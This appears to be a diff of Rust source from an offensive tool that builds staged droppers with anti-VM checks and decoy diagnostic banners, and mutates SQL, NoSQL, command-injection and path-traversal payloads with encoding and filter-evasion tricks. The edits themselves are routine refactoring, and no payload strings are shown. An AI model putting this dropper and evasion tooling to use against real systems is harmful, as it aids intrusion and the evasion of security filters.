@@ -9,7 +9,7 @@
 use anyhow::{anyhow, Result};
 use base64::{engine::general_purpose::STANDARD as BASE64_STANDARD, Engine as _};
 use data_encoding::{BASE32, BASE32HEX, BASE64, BASE64URL};
-use rand::{rng, seq::SliceRandom, prelude::IndexedRandom, Rng};
+use rand::{rng, seq::SliceRandom, prelude::IndexedRandom, RngExt};
 use std::collections::{HashMap, HashSet};
 use std::fmt::Write as FmtWrite;
 use std::fs::File;
@@ -109,28 +109,13 @@ pub fn apply_encodings(input: &[u8], encodings: &[EncodingType]) -> Result<Strin
 }
 
 pub fn encode_base16(data: &[u8]) -> String {
-    let mut result = String::with_capacity(data.len() * 2);
-    for &byte in data {
-        result.push_str(&format!("{:02X}", byte));
-    }
-    result
+    // Use native hex encoder (uppercase for base16 convention)
+    crate::native::hex::encode(data).to_uppercase()
 }
 
 pub fn encode_url(text: &str) -> String {
-    let mut result = String::with_capacity(text.len() * 3);
-    for byte in text.as_bytes() {
-        match *byte {
-            b' ' => result.push('+'),
-            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
-                result.push(*byte as char);
-            }
-            _ => {
-                result.push('%');
-                result.push_str(&format!("{:02X}", byte));
-            }
-        }
-    }
-    result
+    // Delegate to native URL encoder, convert Cow to owned String
+    crate::native::url_encoding::encode(text).into_owned()
 }
 
 pub fn encode_shell_escape(text: &str) -> String {
@@ -418,7 +403,9 @@ impl DropperContext {
         let charset: Vec<char> = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".chars().collect();
         let mut name = String::with_capacity(8);
         for _ in 0..3 {
-            name.push(*charset.choose(&mut rng).expect("Charset empty"));
+            if let Some(&ch) = charset.choose(&mut rng) {
+                name.push(ch);
+            }
         }
         name.push('_');
         name.push_str(&rng.random_range(1000..9999).to_string());
@@ -567,7 +554,7 @@ pub fn build_narutto_stage1(
     stage3_name: &str
 ) -> String {
     let batch_var = ctx.get("diag_id");
-    let banner_text = BANNERS.choose(&mut rng()).expect("Banners empty");
+    let banner_text = BANNERS.choose(&mut rng()).unwrap_or(&"System Diagnostic Tool");
     let antivm = build_anti_vm(ctx);
 
     let mut decoy_section = String::new();
@@ -896,55 +883,65 @@ fn apply_all_mutations(
     category: PayloadCategory,
     config: &MutatorConfig,
 ) -> Vec<String> {
-    let mut results = Vec::new();
     let limit = config.max_variants_per_seed;
+    // Pre-allocate with a cap to prevent unbounded intermediate growth
+    let cap = limit.min(10_000);
+    let mut results = Vec::with_capacity(cap);
 
-    results.extend(mutator_encode_url(payload));
-    results.extend(mutator_encode_double_url(payload));
-    results.extend(mutator_encode_unicode_escape(payload));
-    results.extend(mutator_encode_html_entities(payload));
-    results.extend(mutator_encode_hex(payload));
-    results.extend(mutator_encode_octal(payload));
-    results.extend(mutator_encode_utf8_overlong(payload));
-
-    if config.exhaustive_encoding {
-        for encoded in mutator_encode_url(payload) {
-            results.extend(mutator_encode_url(&encoded));
-        }
-        for encoded in mutator_encode_double_url(payload) {
-            results.extend(mutator_encode_url(&encoded));
-        }
-        results.extend(mutator_encode_mixed_partial(payload));
+    macro_rules! extend_capped {
+        ($iter:expr) => {
+            if results.len() < cap {
+                results.extend($iter.into_iter().take(cap - results.len()));
+            }
+        };
     }
 
-    results.extend(swap_whitespace(payload));
-    results.extend(boundary_wrap(payload));
-    results.extend(null_byte_append(payload));
+    extend_capped!(mutator_encode_url(payload));
+    extend_capped!(mutator_encode_double_url(payload));
+    extend_capped!(mutator_encode_unicode_escape(payload));
+    extend_capped!(mutator_encode_html_entities(payload));
+    extend_capped!(mutator_encode_hex(payload));
+    extend_capped!(mutator_encode_octal(payload));
+    extend_capped!(mutator_encode_utf8_overlong(payload));
+
+    if config.exhaustive_encoding && results.len() < cap {
+        for encoded in mutator_encode_url(payload) {
+            extend_capped!(mutator_encode_url(&encoded));
+        }
+        for encoded in mutator_encode_double_url(payload) {
+            extend_capped!(mutator_encode_url(&encoded));
+        }
+        extend_capped!(mutator_encode_mixed_partial(payload));
+    }
+
+    extend_capped!(swap_whitespace(payload));
+    extend_capped!(boundary_wrap(payload));
+    extend_capped!(null_byte_append(payload));
 
     match category {
         PayloadCategory::SQLi => {
-            results.extend(sql_comment_inject(payload));
-            results.extend(sql_case_toggle(payload));
-            results.extend(sql_concat_split(payload));
-            results.extend(sql_version_comment(payload));
-            results.extend(sql_alternative_syntax(payload));
-            results.extend(sql_hex_encode_strings(payload));
+            extend_capped!(sql_comment_inject(payload));
+            extend_capped!(sql_case_toggle(payload));
+            extend_capped!(sql_concat_split(payload));
+            extend_capped!(sql_version_comment(payload));
+            extend_capped!(sql_alternative_syntax(payload));
+            extend_capped!(sql_hex_encode_strings(payload));
         }
         PayloadCategory::NoSQLi => {
-            results.extend(nosql_operator_variants(payload));
-            results.extend(nosql_unicode_escape(payload));
+            extend_capped!(nosql_operator_variants(payload));
+            extend_capped!(nosql_unicode_escape(payload));
         }
         PayloadCategory::CMDi => {
-            results.extend(cmd_separator_variants(payload));
-            results.extend(cmd_variable_expansion(payload));
-            results.extend(cmd_quoting_tricks(payload));
-            results.extend(cmd_wildcard_bypass(payload));
+            extend_capped!(cmd_separator_variants(payload));
+            extend_capped!(cmd_variable_expansion(payload));
+            extend_capped!(cmd_quoting_tricks(payload));
+            extend_capped!(cmd_wildcard_bypass(payload));
         }
         PayloadCategory::Traversal => {
-            results.extend(traversal_encoding_variants(payload));
-            results.extend(traversal_os_variants(payload));
-            results.extend(traversal_null_extension(payload));
-            results.extend(traversal_double_dot_variants(payload));
+            extend_capped!(traversal_encoding_variants(payload));
+            extend_capped!(traversal_os_variants(payload));
+            extend_capped!(traversal_null_extension(payload));
+            extend_capped!(traversal_double_dot_variants(payload));
         }
     }
 
